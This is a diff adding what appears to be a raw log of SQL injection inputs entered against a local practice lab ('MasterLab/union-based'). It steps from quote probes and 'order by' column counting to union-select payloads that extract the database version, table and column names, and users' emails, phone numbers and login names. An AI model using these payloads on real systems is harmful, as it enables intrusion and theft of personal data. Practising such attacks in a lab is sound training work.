@@ -1,0 +1,256 @@
+ID:
+ID:1
+ID:1'
+ID:1'
+ID:1
+ID:1
+ID:1
+ID:
+ID:
+ID:
+ID:1
+ID:1
+ID:1'
+ID:1'
+ID:1
+ID:1' union select 1,2,3
+ID:1' union select 1,2,3 --
+ID:1' union select 1,2,3 -- 
+ID:1' union select 1,4,3 -- 
+ID:1' union select 2,4,3 -- 
+ID:1' union select 2,4,5 -- 
+ID:1' union select 1,4,5 -- 
+ID:1' union select 1,4,5  -- 
+ID:1111' union select 1,4,5  -- 
+ID:1111' union select 1,version)(),5  -- 
+ID:1111' union select 1,version(),5  -- 
+ID:-1' union select 1,version(),5  -- 
+ID:-1' union select 1,2,5  -- 
+ID:-1' order by 1--
+ID:1' order by 1--
+ID:1' order by 1-- 
+ID:-1' order by 1-- 
+ID:-1' order by 1--
+ID:4' order by 1--
+ID:4' order by 1-- 
+ID:4' order by 13-- 
+ID:1' order by 13-- 
+ID:4' order by 13-- 
+ID:4' order by 15-- 
+ID:4' order by 14-- 
+ID:4' order by 4-- 
+ID:4' order by 3-- 
+ID:1' order by 3-- 
+ID:2' order by 3-- 
+ID:3' order by 3-- 
+ID:4' order by 3-- 
+ID:1
+ID:1
+ID:5
+ID:5 order by 5--
+ID:-5'%order%by%6%-- 
+ID:-5'%order%by%5%-- 
+ID:-5'%order%by%3%-- 
+ID:1
+ID:1'
+ID:1' order  by 1--
+ID:1' order  by 1-- 
+ID:-1' order  by 1-- 
+ID:-1' order  by 1--
+ID:1
+ID:1'
+ID:1 order by 1--
+ID:1 order by 6--
+ID:1 order by 7--
+ID:1 order by 8--
+ID:1' order by 8--
+ID:-1' order by 8--
+ID:1' order by 8--
+ID:-6' order by 8--
+ID:-6' order by 1--
+ID:111' order by 1--
+ID:111' order by 1-- 
+ID:111' order by 1--
+ID:111' order by 1--
+ID:111' order by 1-- 
+ID:111' order by 3-- 
+ID:111' order by 4-- 
+ID:111' order by 5-- 
+ID:111' order by 7-- 
+ID:111' union all select 1,2,3,4,5,6,7-- 
+ID:111' union all select 1,2,3,4,5,6-- 
+ID:111' union all select 1,version(),3,4,5,6-- 
+ID:1
+ID:111' order by 1--
+ID:111' order by 1-- 
+ID:111' order by 7-- 
+ID:111' order by 6-- 
+ID:111' union select 1,2,3,4,5,6-- 
+ID:4'
+ID:4
+ID:4' -- 
+ID:4' order by 1 -- 
+ID:4' order by 6 -- 
+ID:4' order by 7 -- 
+ID:4' union all select 1,2,3,4,5,6 -- 
+ID:-4' union all select 1,2,3,4,5,6 -- 
+ID:-4' union all select 1,2,3,4,database(),6 -- 
+ID:-4' union all select 1,2,3,4,database(),version() -- 
+ID:4
+ID:4'
+ID:-4' union all select 1,2,3,4,database(),6 -- 
+ID:-4' union all select 1,2,3,4,database(),version() -- 
+ID:4
+ID:4'
+ID:4' order by 1 -- 
+ID:4' order by 5 -- 
+ID:4' order by 6 -- 
+ID:4' order by 7 -- 
+ID:-4' union all select 1,2,3,4,5,6 -- 
+ID:-4' union all select 1,2,3,4,5,database() -- 
+ID:-4' union all select 1,2,3,4,version(),database() -- 
+ID:-5' union all select 1,2,3,4,version(),database() -- 
+ID:6
+ID:3
+ID:10
+ID:1
+ID:2
+ID:3
+ID:4
+ID:5
+ID:7
+ID:3
+ID:3'
+ID:-3 order by 1,2,3,4,5,6'
+ID:-3' order by 1,2,3,4,5,6 -- 
+ID:-3\ order by 1,2,3,4,5,6 -- 
+ID:-3\ union all select 1,2,3,4,5,6 -- 
+ID:3
+ID:3\
+ID:3[
+ID:3]
+ID:3;
+ID:3'
+ID:3/
+ID:3\
+ID:3'
+ID:3\
+ID:3' order by 6 -- 
+ID:3' order by 7 -- 
+ID:3' union all select 1,2,3,4,5,6 -- 
+ID:3' union all select 1,2,3,4,5,6,7 -- 
+ID:-3' union all select 1,2,3,4,5,6,7 -- 
+ID:-3' union all select 1,2,3,4,5,6, -- 
+ID:-3' union all select 1,2,3,4,5,6 -- 
+ID:-3\ union all select 1,2,3,4,5,6 -- 
+ID:1
+ID:10
+ID:2
+ID:3
+ID:4
+ID:4'
+ID:4' order by 1 -- 
+ID:4' order by 6 -- 
+ID:4' order by 7 -- 
+ID:-4'         union all select 1,2,3,4,5,6-- 
+ID:-4'         union all select 1,2,3,4,5,6 -- 
+ID:-4'         union all select 1,2,3,4,database(),6 -- 
+ID:-4'         union all select 1,2,3,4,database(),version() -- 
+ID:1
+ID:1'
+ID:1'
+ID:1/
+ID:1\
+ID:1"
+ID:1''
+ID:1'
+ID:1\
+ID:1 order by 1--
+ID:1 order by 2--
+ID:1 order by 50--
+ID:1 order by 500--
+ID:1' order by 500-- -
+ID:1' order by 10-- -
+ID:1' order by 9-- -
+ID:1' order by 8-- -
+ID:1' order by 6-- -
+ID:1' order by 7-- -
+ID:1' union select 1,2,3,4,5,6-- -
+ID:-1' union select 1,2,3,4,5,6-- -
+ID:1' union select 1,2,3,4,5,6-- -
+ID:-1' union select 1,2,3,4,5,6-- -
+ID:-1' union select 1,2,3,4,version(),6-- -
+ID:-1' union select 1,2,3,4,database(),6-- -
+ID:-1' union select 1,2,3,4,table_name,6 from information_schema.tables where table_schema=database()-- -
+ID:-1' localhost/MasterLab/union-based/index.php?id=-1' union select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema=database()-- -
+ID:-1' localhost/MasterLab/union-based/index.php?id=-1' union select 1,2,3,4,table_name,6 from information_schema.tables where table_schema=database()-- -
+ID:-1' union select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema=database()-- -
+ID:-1' union select 1,2,3,4,group_concat(column_name),6 from information_schema.columns where table_name='users'-- -
+ID:-1' union select 1,2,3,4,group_concat(id,EMAIL,PHONE_NO,CITY,LOGIN_NAME),6 from users-- -
+ID:-1' union select 1,2,3,4,group_concat(id,0x3a,EMAIL,0x3a,PHONE_NO,0x3a,CITY,0x3a,LOGIN_NAME),6 from users-- -
+ID:4
+ID:4'
+ID:4 union all select 1,2,3,4 --
+ID:4 order by 5 --
+ID:4 order by 8 --
+ID:-4 order by 8 --
+ID:-4 order by 4 --
+ID:-4 order by 5 --
+ID:-4 order by 0 --
+ID:-4 order by 0--
+ID:-4 order by 9--
+ID:4 order by 9--
+ID:4' order by 9--
+ID:4' order by 6--
+ID:4' order by 5--
+ID:4' order by 4--
+ID:4' order by 3--
+ID:4' order by 6-- 
+ID:4' order by 7-- 
+ID:4' order by 6-- 
+ID:-4' union all select 1,2,3,4,5,6-- 
+ID:-4' union all select 1,2,3,4,table_name,6 from information_schema.tables-- 
+ID:-4' union all select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema=database()-- 
+ID:4
+ID:4 order by 1 --
+ID:4 order by 7 --
+ID:4 order by 6 --
+ID:4 order by 9 --
+ID:4' order by 7 --
+ID:4' order by 6 --
+ID:4' order by 5 --
+ID:4' order by 4 --
+ID:4' order by 3 --
+ID:4' order by 4 -- 
+ID:4' order by 7 -- 
+ID:4' order by 6 -- 
+ID:4' union all select 1,2,3,4,5,6 -- 
+ID:4' union all select 1,2,3,4,5,6,7 -- 
+ID:4' union all select 1,2,3,4,5,6 -- 
+ID:4' union all select 1,2,3,4,5, -- 
+ID:-4' union all select 1,2,3,4,5,6 -- 
+ID:-4' union all select 1,2,database(),4,5,6 -- 
+ID:-4' union all select 1,2,3,4,database(),6 -- 
+ID:-4' union all select 1,2,3,4,table_name,6 from information_schema.tables-- 
+ID:-4' union all select 1,2,3,4,group_concat(table_name),6 from information_schema.tables-- 
+ID:-4' union all select 1,2,3,4,group_concat(table_name),6 from information_schema.tables-- 
+ID:-4' union all select 1,2,3,4,group_concat(table_name),6 from information_schema.tables-- 
+ID:-4' union all select 1,2,3,4,group_concat(column_name),6 from information_schema.column where table_name='CHARATCTER_SETS'-- 
+ID:-4' union all select 1,2,3,4,group_concat(column_name),6 from information_schema.column where table_name=database()-- 
+ID:-4' union all select 1,2,3,4,group_concat(column_name),6 from information_schema.column-- 
+ID:-4' union all select 1,2,3,4,group_concat(table_name),6 from information_schema.table-- 
+ID:-4' union all select 1,2,3,4,group_concat(table_name),6 from information_schema.table-- 
+ID:-4' union all select 1,2,3,4,column_name,6 from information_schema.table-- 
+ID:-4' union all select 1,2,3,4,column_name,6 from information_schema.tables-- 
+ID:-4' union all select 1,2,3,4,column_name,6 from information_schema.tables -- 
+ID:1'
+ID:1
+ID:2
+ID:3
+ID:4
+ID:5
+ID:4
+ID:5
+ID:4
+ID:4'
+ID:4 order by 1,2,3,4 --
